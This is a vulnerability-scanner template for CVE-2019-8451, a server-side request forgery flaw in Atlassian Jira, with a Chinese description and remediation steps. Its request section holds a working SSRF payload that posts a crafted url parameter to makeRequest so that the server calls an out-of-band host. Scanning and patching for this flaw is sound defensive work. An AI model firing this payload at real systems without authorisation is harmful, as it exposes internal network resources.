id: CVE-2019-8451
info:
  name: JIRA SSRF in the /plugins/servlet/gadgets/makeRequest resource
  author:
  - l0ne1y
  tags:
  - cve
  - cve2019
  - atlassian
  - jira
  - ssrf
  - oast
  description: |-
    Atlassian Jira makeRequest SSRF漏洞
    Atlassian Jira是澳大利亚Atlassian公司的一套缺陷跟踪管理系统。该系统主要用于对工作中各类问题、缺陷进行跟踪管理。8.4.0版本之前的Jira中的/plugins/servlet/gadgets/makeRequest资源允许远程攻击者通过服务器端请求伪造（SSRF）漏洞访问内部网络资源的内容，这是由于JiraWhitelist类中存在逻辑错误造成的。
  reference:
  - https://www.tenable.com/blog/cve-2019-8451-proof-of-concept-available-for-server-side-request-forgery-ssrf-vulnerability-in
  - https://jira.atlassian.com/browse/jraserver-69793
  - https://hackerone.com/reports/713900
  severity: medium
  classification:
    cve-id:
    - cve-2019-8451
    cwe-id:
    - cwe-918
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
    cvss-score: 6.5
  remediation: |-
    官方修复方案：
    目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://jira.atlassian.com/browse/JRASERVER-69793

    临时修复方案：
    1、过滤内网服务器对公网服务器请求的响应。如果Web应用是获取某一类型的文件，在把返回结果展示给用户之前应先验证返回的信息是否符合文件类型标准，比如返回信息应为图片，如果返回信息是HTML，则停止将返回信息返回客户端。
    2、统一错误提示信息，避免用户可以根据错误信息来判断远端服务器的端口状态。
    3、在内网服务器的防火墙上限制公网服务器的请求端口为HTTP等协议常用端口，如：80、443、8080、8090。
    4、若公网服务器的内网IP与内网无业务通信，建议将公网服务器对应的内网IP列入黑名单，避免应用被用来获取内网数据。
    5、内网服务器禁用不必要的协议，仅允许HTTP和HTTPS请求，防止类似于file:///、gopher://、ftp:// 等协议引起的安全问题。
requests:
- matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  path:
  - '{{BaseURL}}/plugins/servlet/gadgets/makeRequest'
  method: POST
  body: |
    url=https://{{Host}}:443@{{interactsh-url}}
  headers:
    Content-Type: application/x-www-form-urlencoded
    X-Atlassian-Token: no-check
